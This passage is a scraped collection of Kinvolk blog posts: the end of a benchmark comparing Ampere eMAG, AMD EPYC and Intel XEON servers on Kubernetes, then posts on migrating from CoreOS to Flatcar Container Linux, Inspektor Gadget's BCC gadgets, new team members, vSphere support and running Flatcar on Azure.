off hyperthreading to protect against Spectre-class hardware vulnerabilities such as MDS and L1TF. Single-threaded, to benchmark the performance of a single physical core The result charts are laid out accordingly: Raw Performance Performance per $ [ Chart for hyperthreads performance ] [ hyperthreads performance per dollar ] [ Chart for physical cores performance ] [ physical cores performance per dollar ] [ Chart for single core performance ] [ single threaded performance per dollar ] The big bars show the mean of the results, the small overlay bars show the distance to minima and maxima of the results. Hardware-level Benchmarks CPU speed and Memory I/O rates We use the following tests for stressing CPUs and Memory I/O: sysbench memory (multi-thread memory writes, raw throughput rates in MB/s) cpu (float-heavy prime number generation) stress-ng vecmath (128bit integer vector math operations w/ 8, 16, 32, and 64 bit vector values) matrix (floating point matrix operations – add, sub, mul, div, dot product, etc.) memcpy , which also stresses caches (copy 2MB of memory, then mem-move with 3 different alignments) Disclaimer: As noted after the presentation of the three system specifications, Ampere’s eMAG is not optimized for floating point and vector operations. As these are anyway present in many different workloads we think it’s beneficial to measure the current performance even if future versions of the hardware may perform better. Setup The benchmark pods run on the Kubernetes worker node with a run length of 30 seconds and multiple iterations directly after each other. Here are the effective command lines for the linked container images; the threads count is varied from number of CPU threads, to number of cores to a single thread: sysbench --threads=$PARAMETER --time=30 memory --memory-total-size=500G run sysbench --threads=$PARAMETER --time=30 cpu run stress-ng --(vecmath|matrix|memcpy) --threads=$PARAMETER --timeout 30s --metrics-brief Summary Memory-heavy workloads – multi-threaded applications that change large amounts of RAM in brief amounts of time, like in-memory databases and key-value stores, run extremely well on Ampere’s eMAG. Both AMD’s EPYC and Intel’s XEON run into memory bus contention issues when many threads/processes try to access memory at the same time. eMAG displays impressive vertical scalability with many-threaded memory I/O, allowing for running a high number of processes (for instance, pods) without impacting individual memory data rates. For some compute-intensive benchmarks – mainly integer and floating point micro-benchmarks of the stress-ng suite – we found AMD’s EPYC in the lead, both with raw performance as well as with cost-performance ratio. Ampere’s eMAG matches or exceeds EPYC performance in the more generic cpu benchmark of the sysbench suite, and generally offers a good cost/performance ratio over Intel’s XEON. sysbench memory In multi-thread benchmarks of raw memory I/O we found a clear performance leader in Ampere’s eMAG, outperforming both AMD’s EPYC and Intel’s XEON CPUs by a factor of 6 or higher. We believe that many-thread memory I/O leads to a high amount of memory bus contention on both Intel and AMD, while Arm has an architectural advantage over both x86s. Raw Performance (you may need to scroll → to see the other column) Performance per $ sysbench cpu In the floating-point heavy CPU benchmark, Ampere’s eMAG leads the field both in raw performance and regarding cost-per-operation when multiple threads are involved, with AMD’s EPYC in a close lead regarding raw single-thread performance. There is no noticeable performance gain from EPYC’s hyperthreading, suggesting that this benchmark utilizes CPU resources that cannot be shared between the siblings of a hyperthread. The varying minimum and maximum performance when the thread count equals the CPU thread count for AMD and Intel comes from the scheduling differences when two hyperthreads access the same core resources. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng vecmath In the integer vector operations micro-benchmark, AMD’s EPYC and Intel’s XEON lead the race performance wise and while AMD leads with cost-per-cycle. Ampere’s eMAG offers a similar performance-per dollar ratio as Intel’s XEON. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng matrix Similar to integer performance above, AMD’s EPYC and Intel’s XEON lead in stress-ng’s matrix floating point operations performance wise but with a better cost-per-cycle ratio for AMD. Ampere’s eMAG offers a on-par performance-per dollar ratio to Intel’s XEON. The strong variance of minimal and maximal XEON performance comes from scheduling differences when resources of a core are accessed that cannot be shared by hyperthreads. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng memcpy In the memcopy benchmark, which is designed to stress both memory I/O as well as caches, Intel’s XEON shows the highest raw performance, and AMD’s EPYC comes in last. Ampere’s eMAG leads the field – with a small margin over Intel’s XEON – when cost is factored in. We suspect alignment issues to be the main cause of the Ampere eMAG’s lower performance in this benchmark when compared to sysbench’s memory I/O benchmark above. Raw Performance (you may need to scroll → to see the other column) Performance per $ Network Performance We use iperf3 to run single- and multi-connection network performance tests. The program follows the select server design where a single thread handles all connection syscalls. The Linux kernel network stack still takes advantage of multiple CPUs. Network testing used an Intel XEON node as the networking peer (client) in any cluster, so the IPerf benchmark below was performed between XEON↔XEON, EPYC↔XEON, and eMAG↔XEON. We used a XEON client because of the generally satisfying network performance of this platform. The client receives data over TCP from the benchmarked nodes which run the iperf3 server. Since we run on Kubernetes, this means a pod-to-pod connection over Calico’s IP-in-IP overlay network. The iperf3 client was started with 56 TCP connection in all cases (the number of CPU threads on the fixed XEON client). Because we cannot control the number of kernel threads of the network stack that the iperf server will use, we turned Hyperthreading off instead of simulating it by fixing the thread count to the number of cores as before. This was done by running this on the node: sudo sh -c 'echo off > /sys/devices/system/cpu/smt/control' Setup The benchmark has a run length of 30 seconds and multiple iterations directly after each other. The effective command line for the linked containers is as follows; the parameter sets the connection count to 56 or 1: Benchmarked worker node with server pod: iperf3 -s Fixed XEON worker node with client pod: iperf3 -P $PARAMETER -R -c $POD_IP --time 30 Discussion AMD’s EPYC excels in raw network performance and therefore in cost/performance, too. Ampere’s eMAG offers lower throughput jitter, and a better cost/performance ratio, than Intel’s XEON. NOTE again that this here is pod-to-pod traffic. Node-to-node traffic has no problems in saturating the 10G line-rate on all systems. The testing here highlighted that some areas need to be optimized for better network performance on Kubernetes with Calico’s IP-in-IP overlay network. We did not test a node-to-node setup with 100G NICs but results collected in other environments show that Ampere’s eMAG is capable of saturating a 100G line-rate (as are the other systems). Based on the findings here, we expect software optimizations to come that will improve the eMAG performance. Raw Performance – Hyperthreading ON (you may need to scroll → to see the other column) Performance per $ – Hyperthreading ON Raw Performance – Hyperthreading OFF (you may need to scroll → to see the other column) Performance per $ – Hyperthreading OFF Raw Performance – Single (you may need to scroll → to see the other column) Performance per $ – Single Operating System level Benchmarks We use the following tests to benchmark basic runtime and operating system features: sysbench fileio on a tmpfs in-memory filesystem (I/O to 128 files in parallel, stresses OS kernel) stress-ng spawn , sem (POSIX process creation, semaphore operations; stresses OS kernel) shm (8MB shared memory creation/destruction; stresses OS kernel and memory) crypt , hsearch , tsearch , lsearch , bsearch , qsort (C library functions) atomic (compiler-intrinsic atomic memory operations) Setup The benchmark pods run on the Kubernetes worker node with a run length of 30 seconds and multiple iterations directly after each other. Here are the effective command lines for the linked container images; the threads count is varied from number of CPU threads, to number of cores to a single thread: sysbench fileio --file-test-mode=rndwr prepare (ran before the benchmark on a tmpfs in-memory filesystem) sysbench --threads=$PARAMETER --time=30 fileio --file-test-mode=rndwr run (done on the tmpfs in-memory filesystem) stress-ng --(spawn|sem|shm|crypt|hsearch|tsearch|lsearch|bsearch|qsort|atomic) --threads=$PARAMETER --timeout 30s --metrics-brief Summary Ampere’s eMAG displays a significant advantage in memory-heavy and Operating System related tasks that do not require locking. Locking operations push eMAG to the third position wrt. raw performance, and to the second when cost is factored in. AMD’s EPYC takes the lead when synchronization and locking is a factor, both in terms of raw performance as well as for performance/cost. Intel’s XEON delivers a better performance than AMD’s EPYC in non-locking OS related tasks, but falls back to the third position if cost is factored in. System library related tasks are performed best on eMAG when throughput is a factor – eMAG takes a solid lead in the qsort and crypt micro-benchmarks. Intel’s XEON delivers the best performance for search and lookup primitives, with AMD taking the lead when cost is a factor. AMD’s EPYC is, by some margin, the fastest with atomic memory operations, with Intel’s XEON coming in second, and Ampere’s eMAG in a distant third position. sysbench fileio on a tmpfs in-memory filesystem The setup uses a Kubernetes emptyDir Volume backed by the Memory medium which results in a tmpfs mount. Ampere’s eMAG excels at raw file system performance on a tmpfs – writing small amounts of data to many files, with XEON coming in as a close second. The eMAG’s lead over Intel’s XEON increases when cost is factored in, and AMD’s EPYC moves up to the second position. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng spawn The spawn micro-benchmark exercises process generation (using the POSIX spawn API) and process deletion, a basic functionality of operating systems. Ampere’s eMAG leads in the results, with Intel’s XEON being a close second in terms of raw performance. With cost factored in, XEON falls back to the last position, and AMD’s EPYC takes the second position. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng sem This micro-benchmark gauges semaphore performance, acquiring and releasing semaphores in rapid succession. Ampere’s eMAG leads in performance (operations per second) regarding physical cores, but AMD’s EPYC and Intel’s XEON really benefit from hyperthreading, pushing eMAG to the last position if you can afford the trust of turning on HT. When cost is factored in, AMD’s EPYC leads with a large margin, and eMAG and XEON come in second and third, respectively. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng shm The shared memory micro-benchmark creates and destroys multiple shared memory objects per thread, using the POSIX API. Just as with the memory I/O hardware benchmark above, we see eMAG leaving both XEON and EPYC way behind, by a factor. Intel’s XEON comes in second in terms of raw performance, and AMD’s EPYC takes the second position when cost is factored in. Raw Performance (you may need to scroll → to see the other column) Performance per $ stress-ng crypt, hsearch, tsearch, lsearch, bsearch, qsort, atomic The graph below covers a number of stress-ng micro-benchmarks that concern the performance of both standard library and compiler. atomic tests the *__atomic__ compiler intrinsics, crypt executes hashing algorithms (MD5, SHA-256, SHA-512), and the *search tests and qsort perform various lookup and sort functions on 32bit integer values. The results are normalized to Ampere eMAG having the value 1.0 for each benchmark. Normalized performance: Normalized performance per $: Cloud-Native Application Benchmarks We ran benchmarks for memcached, Redis, and nginx to get a better understanding of the overall performance when executing complex cloud-native workloads. Memcached and Redis memtier_benchmark , a high-performance key-value store benchmark from redis. NGINX ab (ApacheBenchmark) to measure max number of HTTP req/sec wrk2 to measure tail latency performance as maximal latency that 99.9% of the HTTP requests have encountered (allowing for 0.1% outliers in each run) fortio fortio HTTP/1.1 and gRPC (HTTP/2) and latency performance as with wrk2 but without Coordinated Omission Memcached memtier The setup consisted of the memcached database and the memtier database client running on the same system. Therefore, the thread count was divided by 2 to have both database and client use each one half of the CPUs. The benchmark pods run on the Kubernetes worker node with a run length of 30 seconds and multiple iterations directly after each other. Here are the effective command lines for the linked container images; the threads count is varied from half the number of CPU threads, to half the number of cores to a single thread: Background database: memcached -t $THREADS Foreground client: memtier_benchmark -P memcache_binary -t $THREADS --test-time 30 --ratio 1:1 -c 25 -x 1 --data-size-range=10240-1048576 --key-pattern S:S The extra arguments specify that the ratio of get to set operations is 1:1, 25 connections are used, one iteration (because we rerun the process for multiple iterations), an object size ranging from 10 KiB to 1 MiB, and a sequential key pattern for both get and set operations. With memcached, Ampere’s eMAG benefits from its significantly higher multi-thread memory bandwidth, leading the field by a large margin. AMD’s EPYC offers a better price/performance ratio than Intel’s XEON. Raw Performance (you may need to scroll → to see the other column) Performance per $ Redis memtier Redis is an in-memory key-value store, but compared to memcached above, it is single-threaded by nature. To test multiple cores/CPUs we launched multiple redis database instances and memtier client instances, and benchmarked in parallel and summed the results up. The benchmark pods run on the Kubernetes worker node with a run length of 30 seconds and multiple iterations directly after each other. Here are the effective command lines for the linked container images; the process count is varied from half the number of CPU threads, to half the number of cores to a single process: Background database processes: redis --port $PROCESS_PORT Foreground client processes: memtier_benchmark -p $PROCESS_PORT -P redis -t 1 --test-time 30 --ratio 1:1 -c 25 -x 1 --data-size-range=10240-1048576 --key-pattern S:S The results for all processes are summed up in an additional step. The extra arguments specify that the ratio of get to set operations is 1:1, 25 connections are used, one iteration (because we rerun the process for multiple iterations), an object size ranging from 10 KiB to 1 MiB, and a sequential key pattern for both get and set operations. All three contenders perform about the same when compared at the physical cores level. With hyperthreading enabled – and the respective security implications accepted – Intel’s XEON clearly moves ahead of the field. AMD’s EPYC has a small gain from hyperthreading, too, leaving eMAG at the third position. AMD also excels at cost/performance running redis, with eMAG in the second position. Raw Performance (you may need to scroll → to see the other column) Performance per $ NGINX ab We use Apache’s ab to benchmark NGINX’ HTTP throughput in requests per second. As with all other network tests (iperf and the following latency tests), the client is an Intel XEON node in all cases and the TCP connections in Kubernetes are pod-to-pod over the Calico’s IP-in-IP overlay network. We used 56 connections because the fixed XEON client has 56 CPU threads. The benchmark has a run length of 30 seconds and multiple iterations directly after each other. The effective command lines for the linked containers are as follows: Benchmarked worker node with server pod: nginx Fixed XEON worker node with client pod: ab -c 56 -t 30 -n 999999999 http://$POD_IP:8000/ (The high number of request just ensures that only the timeout of 30 seconds will terminate the benchmark and not the number of sent requests which is just 50000 by default.) AMD’s EPYC and Intel’s XEON benefit from their significantly better networking performance (see the iperf benchmark above), leaving eMAG at the third position when raw performance is the main concern. Hyperthreading on both XEON and EPYC does not have a noticeable impact on performance, though it adds more jitter in performance when activated. Ampere’s eMAG benefits from its competitive pricing when cost is a concern, moving up to the second position. Raw Performance – Hyperthreading ON (you may need to scroll → to see the other column) Performance per $ Raw Performance – Hyperthreading OFF (you may need to scroll → to see the other column) Performance per $ – Hyperthreading OFF NGINX wrk2 Wrk2 is somewhat of a Kinvolk favorite and has been used in previous works of ours . It’s the only benchmark tool we’re aware of that takes Coordinated Omission into account, which is important for realistically measuring latency in overload situations. Wrk2 takes a constant request rate and calculates the latency from the point in time where the request would have been sent instead of sending requests at the actual (possibly lower than requested) rate, and measuring individual requests’ latencies when the requests are actually sent. As with all other network tests, the client is an Intel XEON node in all cases and the TCP connections in Kubernetes are pod-to-pod over the Calico’s IP-in-IP overlay network. We used 56 connections because the fixed XEON client has 56 CPU threads. The request rate is fixed to 2000 requests per second so that no system is overloaded (cf. the ab results above). The request body has a length of 100 bytes. The benchmark has a run length of 60 seconds and multiple iterations directly after each other. The effective command lines for the linked containers are as follows: Benchmarked worker node with server pod: nginx Fixed XEON worker node with client pod: wrk -d 60s -c 56 -t 56 -R 2000 -L -s /usr/local/share/wrk2/body-100-report.lua http://$POD_IP:8000/ The minimal observed p999 latency was similar across all systems in all datacenter regions. However, there is a lot of jitter and cases with worse p999 latency for the Intel XEON systems. We made a second run with Hyperthreading disabled (instead of forcing nginx to only use half of the CPU threads and because we cannot control the number of kernel threads of the network stack) and did not observe large jitter but also had less samples. Not visible in the charts is that the Intel Xeon server is twice as expensive because there is no meaningful way to display the system cost in regards to the resulting latency since adding more parallel systems won’t reduce the p999 latency of a single system. HTTP P999 Tail Latency With Coordinated Omission (lower is better) – Hyperthreading ON Hyperthreading OFF fortio client with a fortio server We use fortio to measure p999 latency, both for HTTP 1.1 as well as for gRPC (HTTP2). We used 20 connections and fixed the request rate to 2000 req/s. As with all other network tests, the client is an Intel XEON node in all cases and the TCP connections in Kubernetes are pod-to-pod over the Calico’s IP-in-IP overlay network. The benchmark has a run length of 60 seconds and multiple iterations directly after each other. The effective command lines for the linked containers are as follows: Benchmarked worker node with server pod: fortio server -ui-path '' Fixed XEON worker node with client pod for HTTP/1.1: fortio load -c 20 -qps=2000 -t=60s -payload-size=50 -keepalive=false $POD_IP:8080 For HTTP/1.1 the observed minimal p999 latencies across all systems and datacenter regions was similar. This time there was jitter for the AMD EPYC systems with outliers that distort the whole graph. Ampere’s eMAG had p999 latency of ~4ms, AMD’s EPYC ~3-4ms not counting the outliers in, and Intel’s XEON ~3-7ms. We made a second run with Hyperthreading disabled (instead of fixing fortio to half of the CPU threads manually and because we cannot control the number of kernel threads of the network stack) and did not observe large jitter but also had less samples. HTTP/1.1 P999 Tail Latency (lower is better) – Hyperthreading ON HTTP/1.1 P999 Tail Latency (lower is better) – Hyperthreading OFF For gRPC (HTTP/2) we used 20 connections but with 10 HTTP/2 streams per TCP connection. The request rate was fixed to 2000 req/s. The benchmark has a run length of 60 seconds and multiple iterations directly after each other. The effective command lines for the linked containers are as follows: Benchmarked worker node with server pod: fortio server -ui-path '' Fixed XEON worker node with client pod for gRPC: fortio load -grpc -s 10 -c 20 -qps=2000 -t=60s -payload-size=50 -keepalive=false $POD_IP:8079 Both AMD’s Epyc and Intel’s XEON deliver solid latency results for gRPC, about 3 times their HTTP 1.1 latency. Ampere’s eMAG struggles with gRPC and displays massive jitter in its response times. We made a second run with Hyperthreading disabled again and even though we had less samples in this run the previous findings were confirmed. gRPC P999 Tail Latency (lower is better) – Hyperthreading ON gRPC P999 Tail Latency (lower is better) – Hyperthreading OFF Conclusion First of all, Lokomotive Kubernetes and Flatcar Container Linux worked well on arm64 with Ampere’s eMAG. Even hybrid clusters with both arm64 and x86 nodes were easy to use either with multi-arch container images, or the built-in Kubernetes kubernetes.io/arch labels as node selectors. Overall Ampere’s eMAG offers good price/performance ratio. Surprising benchmark results are those where we see Ampere’s eMAG leading for a certain set of use cases. It excels at multi-thread performance, particularly with memory I/O heavy and throughput related workloads (e.g. multi-thread key-value stores and file operations on a tmpfs).\nThese are the clear places where it would pay off to switch the server type. In conclusion the eMAG also feels well-positioned for cloud-native workloads, which tend to fully commit memory and compute resources to pods. AMD’s EPYC has a slight integer/floating point processing advantage with vector arithmetic and is in the same cost range as eMAG, as well as faster IP-in-IP overlay networking, but suffers from lower overall multi-thread throughput. Intel’s XEON, while leading with raw performance in a number of benchmarks, comes in last when cost is factored in. Attached is a performance-per-cost summary graph for the above benchmarks, normalized to the eMAG results, to the EPYC results, and to the XEON results for easy comparison. Compiler and application optimizations for arm64 will likely change the results in the future in particular for those cases where a huge difference was observed (the iperf IP-in-IP scenario is certainly a focus area where we can expect them soon, others are memcpy/memmov and atomics). It will also be interesting to repeat such a benchmark again on the next generations of the three manufacturers given the fact that the eMAG is the first offering of Ampere Computing. The benchmark code is here for reproducibility: https://github.com/kinvolk/benchmark-containers . Future Work We are currently in the process of productizing and polishing Arm support in both Flatcar Container Linux and Lokomotive Kubernetes, and will announce general availability in the near future. Benchmark tools and benchmark automation are publicly available, and may see support for other CPU architectures in the future. Appendix Normalized performance/cost summary graph for eMAG: Normalized performance/cost summary graph for EPYC: Normalized performance/cost summary graph for XEON:", "date": "2019-11-15"},
{"website": "Kinvolk", "title": "Steps to Migrate from CoreOS to Flatcar Container Linux", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kuehl\n    \n    \n    /\n    \n    \n  \n    \n    \n      Kai Lüke\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/03/steps-to-migrate-from-coreos-to-flatcar-container-linux/", "abstract": "Flatcar Container Linux is a drop-in replacement for CoreOS Container Linux. Thus, one should think that a migration should be an effortless task, and it is. Since Red Hat announced that CoreOS Container Linux will reach its end-of-life on May 26 , we’ve seen a major uptick in the usage of Flatcar Container Linux. We’ve also had a number of questions about the migration process. This post looks to highlight how to migrate to Flatcar Container Linux in two ways; modifying your deployment to install Flatcar Container Linux, and updating directly from CoreOS Container Linux. Modifying your deployment to install Flatcar Container Linux Changing your deployment is often a simple one-line change in your configuration. For example, if you’re deploying Flatcar Container Linux on AWS, then you may only require updating the AMI to deploy. If on bare-metal, it may just be a change of path to the images. To make sure your migration goes seamlessly, you should be aware of some small naming differences which you might need to adjust for. We provide a set of migration notes to help you with this. Updating directly into Flatcar Container Linux You may be in a situation where updating directly into Flatcar Container Linux from an existing CoreOS Container Linux install works better for you. In this case, the process is also easy but different. In this scenario, you want to change the update server that is being used and the corresponding signing keys to those used by Flatcar Container Linux. We’ve captured the details in our guide to updating directly into Flatcar Container Linux . In that guide you’ll find this handy script that automates the process. In short, it does these five steps: fetch the new update-payload-key.pub and bind-mount it over the old one, configure the new update server URL, force an update by bind-mounting a dummy release file with version 0.0.0 over the old one, restart the update engine service trigger an update. An example of using the script follows. # To be run on the node via SSH [email protected] ~ $ wget https://docs.flatcar-linux.org/update-to-flatcar.sh [email protected] ~ $ chmod +x update-to-flatcar.sh [email protected] ~ $ ./update-to-flatcar.sh [ … ] Done, please reboot now [email protected] ~ $ sudo systemctl reboot As Flatcar Container Linux uses the exact same update mechanisms as CoreOS Container Linux, rebooting the machine will have you in a Flatcar Container Linux environment, a familiar place for those coming from the CoreOS world. As with the previous method, please heed the set of migration notes we provide. That’s it If you follow the simple steps above, your migration should go without a hitch. If you encounter problems, please let us know by filing an issue or getting in touch at [email protected] .", "date": "2020-03-18"},
{"website": "Kinvolk", "title": "Adding new BCC-based gadgets in Inspektor Gadget", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/04/adding-new-bcc-based-gadgets-in-inspektor-gadget/", "abstract": "When asked for a good source to learn how to write BPF code I send people to the BPF\nCompiler Collection (BCC) project - https://github.com/iovisor/bcc . In addition to a\nC/C++ library for BPF and bindings in Python and LUA, it contains various\ntracing tools with clear examples of how to use them. It’s useful to read the\nsource of those tools to learn the coding patterns with BPF. A number of the gadgets in Inspektor Gadget such as execsnoop and opensnoop are directly based on BCC tools execsnoop and opensnoop without modifications. In this case, Inspektor Gadget provides the high-level\nkubectl-like user experience: users don’t have to install BCC on the nodes, no\nneed to ssh into the nodes, and they can use high level concepts like Kubernetes\nlabels to filter the traces. Last month, BCC gained a new tracing tool: bindsnoop . It traces the kernel\nfunction performing socket binding. It allows users, for example, to see that\nnginx binds on TCP port 80. Thus, we wanted to integrate bindsnoop into a\nInspektor Gadget gadget in order to help debug why connections might fail.  In\norder to make integrating new BCC tools into Inspektor Gadget, we introduced a\nnew --cgroupmap option into BCC that allows for filtering by cgroups .\nWith this change, BCC tools can be integrated seamlessly into Inspektor Gadget.\nIndeed, bindsnoop was integrated with only a few lines of\ncode . How it works The Gadget Tracer Manager is a daemon deployed as a DaemonSet that keeps track\nof the gadgets currently running in Inspektor Gadget (such as bindsnoop or\nexecsnoop) and the containers running on each node. When the user starts\na new instance of gadget like bindsnoop, the Gadget Tracer Manager\npopulates a BPF map with the set of cgroup ids of containers that should be\ntraced by that gadget. Here is a simple diagram illustrating it: Conclusion It’s become easier to add new gadgets in Inspektor Gadget thanks to BCC.  As an\nOpen Source project, contributions are welcome. Join the discussions on the #inspektor-gadget channel in the Kubernetes Slack or, if you want to know about our services\nrelated to BPF and Kubernetes, reach us at [email protected] .", "date": "2020-04-02"},
{"website": "Kinvolk", "title": "Kinvolk welcomes Sayan and Marga to the team", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kuehl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/04/kinvolk-welcomes-sayan-and-marga-to-the-team/", "abstract": "Today we would like to welcome Sayan Chowdhury and Marga\nManterola to Kinvolk, where they start on the team\nbuilding Flatcar Container Linux . We look forward  to them adding to\nthe project their wealth of experience in building and maintaining Linux distributions. Both have not only been active contributors to many open source projects, but have also played key\nroles in organizing events and driving engagement in their respective communities. These traits are\nsomething we at Kinvolk cherish and try to embody as a team. Without further ado, let’s introduce the new Volk. Sayan Chowdhury Sayan joins us from Bangalore, India. He brings 7 years of industry experience, working on various\nopen source projects in multiple areas. Sayan started his career at HackerEarth back in 2013, joining as the first engineer on the team. He\nhelped the team scale the infrastructure supporting from 3k to a million users. He also built the\nHackerEarth Sprint platform end to end. Sayan has been a long-time contributor to the Fedora Project, working on projects maintained by the\nFedora Infrastructure team, and later joining the Fedora team at Red Hat in 2015 to contribute full\ntime. As a part of the team, he worked with building projects to support the Fedora Atomic release\npipeline.  He was also responsible for maintaining the pipeline for the Fedora images on various\ncloud providers. Later, Sayan moved to the Red Hat CoreOS team, to work on releasing Fedora CoreOS. He joins Kinvolk’s OS & Security team to help streamline the release of Flatcar Container Linux, and\nship more exciting features to the product. Marga Manterola Joining us from Munich, Germany, Marga adds yet more Linux expertise to our teams. A Debian Developer and Open Source enthusiast, Marga has been working with Linux for over 15 years.\nBack in her hometown of Buenos Aires, Argentina, she led a large migration to Linux and open source\ntools. Doing this job, she learned to navigate the tricky line between satisfying user needs and\nkeeping the software stack in good shape. For the past 7 years, she’s worked as a Site Reliability Engineer at Google, in the team maintaining\nthe internal Linux distribution used by Google engineers.  There, she led the development of many\nautomation tools, allowing the team to keep tens of thousands of computers updated and secure. She’s\ngrown used to thinking about large scale issues and focusing on the most impactful things to\nautomate. She joins Kinvolk as a Staff Software Engineer, and will help bring more automation to the Flatcar\nContainer Linux build and test infrastructure.", "date": "2020-04-16"},
{"website": "Kinvolk", "title": "VMware and Kinvolk bring Flatcar Container Linux to vSphere, providing supported path forward for CoreOS users", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andy Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/04/vmware-and-kinvolk-bring-flatcar-container-linux-to-vsphere-providing-supported-path-forward-for-coreos-users/", "abstract": "Recently, we have been working with many end users who, faced with the imminent\nend-of-life of CoreOS Container Linux, are migrating to Flatcar Container Linux\nas the secure foundation for their container deployments. And, with the\nmajority of enterprises adopting vSphere for their private clouds 1 , we have\nheard from many of those users that fully certified support for vSphere is an\nimportant consideration in their migration decision. Today, we are pleased to share details of our collaboration with VMware to\nenable the deployment of Flatcar Container Linux in a fully-supported vSphere\nenvironment. There are a number of important elements to this: Most prominently, Flatcar Container Linux is now listed in the vSphere\nCompatibility\nGuide as “Supported”, meaning that VMware is committed to providing full support to\nits customers who choose to deploy Flatcar. Flatcar Container Linux now ships with a vSphere-optimized build, including\nOpen VM Tools, and testing on vSphere is integrated into our continuous\nintegration suite, meaning every new release is validated by Kinvolk on\nvSphere. Our engineering teams continue to collaborate on multiple initiatives to\nfurther enhance the end-user experience of Flatcar Container Linux as a guest\nOS in vSphere, and as a foundation for Kubernetes in VMware environments. Kinvolk and VMware’s support teams have set up joined-up processes for\ncollaboratively supporting our joint end user customers. As a result of this collaboration, VMware is recommending that current CoreOS Container Linux users migrate to Flatcar Container Linux as quickly as\npossible, and by May 26 (the date when Red Hat will no longer provide\nmaintenance and security updates) at the latest. To find out how to run Flatcar Container Linux as your guest OS in vSphere,\nplease see the documentation on running Flatcar in VMware and on how to update a VM from CoreOS to Flatcar Container Linux. If you have decided to adopt Flatcar Container Linux as the foundation for your\ncontainer environment, and want to have the peace-of-mind of enterprise support\nwith a service level agreement (including 24x7 and joined-up support between\nKinvolk and VMware), please email [email protected] to discuss a Flatcar Container Linux Subscription. RightScale 2019 State of the Cloud Report, by Flexera ↩︎", "date": "2020-04-21"},
{"website": "Kinvolk", "title": "Running Flatcar Container Linux in Microsoft Azure", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kuehl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/04/running-flatcar-container-linux-in-microsoft-azure/", "abstract": "Recently, we showed how easy it is to migrate from CoreOS Container Linux to Flatcar Container Linux . Today we’re going to build on that to show how to start instances of Flatcar Container Linux on Azure and how to migrate existing Azure instances running CoreOS Container Linux. Note: Red Hat announced CoreOS Container Linux will reach its end-of-life on May 26 . Flatcar Container Linux is the only drop-in replacement going forward. Creating a Flatcar Container Linux instance on Azure Let’s start by looking at how to create a new Flatcar Container Linux instance of Azure. Firstly, Azure instances must be created in a new resource group in a location of your choosing. az group create --name group-1 --location <location> Once that’s done we can deploy a new instance using the following commands. $ az vm image list --all -p kinvolk -f flatcar -s stable # Query the image name urn specifier [ { \"offer\" : \"flatcar-container-linux\" , \"publisher\" : \"kinvolk\" , \"sku\" : \"stable\" , \"urn\" : \"kinvolk:flatcar-container-linux:stable:2345.3.1\" , \"version\" : \"2345.3.1\" } ] $ az vm create --name node-1 --resource-group group-1 --admin-username core --custom-data \" $( cat config.ign ) \" --image kinvolk:flatcar-container-linux:stable:2345.3.1 The above queries the Azure API for the image information. In this case, we’re looking for the stable channel and in this the version is 2345.3.1. We use the fetched information and the group name to run az vm create to launch our new instances. Migrating from CoreOS to Flatcar Container Linux There are two basic ways to migrate from CoreOS Container Linux to Flatcar Container Linux. The first is to modify your deployment. The other way is to do an in place update of your instance using CoreOS’ built in update mechanism. Let’s look at both, below. Modifying your deployment to install Flatcar Container Linux Changing your deployment is often a simple one-line change in your configuration. For example. If you have an existing CoreOS deployment script you likely only need to change the offer and publisher that you’ve seen above. For example, from the following CoreOS install command… az vm create --name node-1 --resource-group group-1 --admin-username core --custom-data \" $( cat config.ign ) \" --image CoreOS:CoreOS:Alpha:latest …you only need to update the --image flag to kinvolk:flatcar-container-linux:stable:2345.3.1 There are some small naming differences you should be aware of. We provide a set of migration notes to help you with this. Updating directly into Flatcar Container Linux You may be in a situation where updating directly into Flatcar Container Linux from an existing CoreOS Container Linux install works better for you. In this case, the process is also easy but different. In this scenario, you want to change the update server that is being used and the corresponding signing keys to those used by Flatcar Container Linux. We’ve captured the details in our guide to updating directly into Flatcar Container Linux . In that guide you’ll find this handy script that automates the process. In short, it does these five steps: fetch the new update-payload-key.pub and bind-mount it over the old one, configure the new update server URL, force an update by bind-mounting a dummy release file with version 0.0.0 over the old one, restart the update engine service trigger an update. An example of using the script follows. _# To be run on the node via SSH_ [email protected] ~ $ wget https://docs.flatcar-linux.org/update-to-flatcar.sh [email protected] ~ $ chmod +x update-to-flatcar.sh [email protected] ~ $ ./update-to-flatcar.sh [ … ] Done, please reboot now [email protected] ~ $ sudo systemctl reboot As Flatcar Container Linux uses the exact same update mechanisms as CoreOS Container Linux, rebooting the machine will have you in a Flatcar Container Linux environment, a familiar place for those coming from the CoreOS world. As with the previous method, please heed the set of migration notes we provide. If you’re starting from scratch or migrating to Flatcar Container Linux from CoreOS, we’ve hopefully given you what you need to get started. For further information about running Flatcar in Azure and using Flatcar Container Linux in production please consult the documentation . If you encounter problems, please let us know by filing an issue . For inquiries about support, you can reach us at [email protected] .", "date": "2020-04-24"},
